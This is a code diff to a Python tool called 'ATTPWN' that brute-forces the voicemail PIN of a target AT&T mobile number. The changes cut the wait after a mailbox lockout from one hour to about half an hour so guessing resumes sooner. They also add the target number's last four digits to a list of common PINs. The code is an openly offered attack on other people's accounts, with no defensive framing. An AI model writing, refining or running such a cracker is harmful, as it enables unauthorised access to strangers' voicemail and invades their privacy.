@@ -16,18 +16,19 @@ def cracker(x):
         elif "blocked" in str(e) or ("locked" in str(e)):
             print("[-] "+str(x))
             print("[!] Mailbox locked! Sleeping for one hour (try letting this run while you sleep...)")
-            time.sleep(3601)
+            #turns out you only need to sleep about half an hour before mailbox lock is lifted :D
+            time.sleep(1801)
         else:
             print("[!] "+str(e))
             exitNow = input("Would you like to exit? ('Y' for yes, anything else for no): ")
             if exitNow == "Y":
                 exit()
 
-topPins = ["1111","2222","3333","4444","5555","6666","7777","8888","9999","0000","1234","6969","1010","0101","7890","6789","4321"]
-
 art.tprint("ATTPWN")
 
 tarNum = input("Enter target mobile number (must be att number!): ")
+
+topPins = ["1111","2222","3333","4444","5555","6666","7777","8888","9999","0000","1234","6969","1010","0101","7890","6789","4321",tarNum[len(tarNum)-4:len(tarNum)]] #added last 4 digits of number
 
 useTop = input("Use top pins? ('Y' to use, anything else to use incremental): ")
 
